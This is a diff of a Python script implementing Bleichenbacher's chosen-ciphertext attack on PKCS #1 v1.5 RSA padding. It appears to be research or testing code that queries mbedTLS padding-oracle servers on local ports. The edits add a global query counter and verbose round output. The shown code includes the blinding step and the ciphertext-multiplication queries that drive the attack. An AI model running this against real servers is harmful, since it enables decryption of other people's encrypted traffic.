@@ -2,7 +2,7 @@
 Chosen-ciphertext attack on PKCS #1 v1.5
 http://archiv.infsec.ethz.ch/education/fs08/secsem/bleichenbacher98.pdf
 """
-from oracles import PKCS1_v1_5_Oracle, PKCS1_v1_5_Oracle_MbedTLS
+from oracles import Oracle_MbedTLS
 from os import urandom
 from Crypto.PublicKey import RSA
 import subprocess
@@ -104,16 +104,19 @@ def blinding(k, key, c, oracle):
 
 
 def s_c_conform(key, c, s, oracles, k):
+    global total_queries
     queries = []
     for i, oracle in enumerate(oracles):
         queries.append(oracle.query_async(((c * pow(s + i, key.e, key.n)) % key.n).to_bytes(k, byteorder='big')))
         next(queries[-1])  # send frame
     retval = -1
     for i, query in enumerate(queries):
+        total_queries += 1
         if next(query) and retval == -1:  # recv result
             retval = s + i
     return retval
 
+total_queries = 0
 
 def find_min_conforming(key, c_0, min_s, oracles, k_arg=None):
     """
@@ -210,7 +213,7 @@ def bleichenbacher_attack(k, key, c, oracles, verbose=False):
     i = 1
     while True:
         if verbose:
-            print("Round ", i)
+            print("Round ", i, " (total queries %d)" % total_queries)
         if i == 1:
             s = find_min_conforming(key, c_0, divceil(key.n, 3 * B), oracles, k_arg=k)
         elif len(m) > 1:
@@ -255,7 +258,7 @@ if __name__ == "__main__":
 
     oracles = []
     for port in range(args.start_port, args.start_port + args.num_servers):
-        oracles.append(PKCS1_v1_5_Oracle_MbedTLS(pub_key, port=port))
+        oracles.append(Oracle_MbedTLS(port=port))
 
     if args.given_enc is not None:
         with open(args.given_enc, "rb") as f:
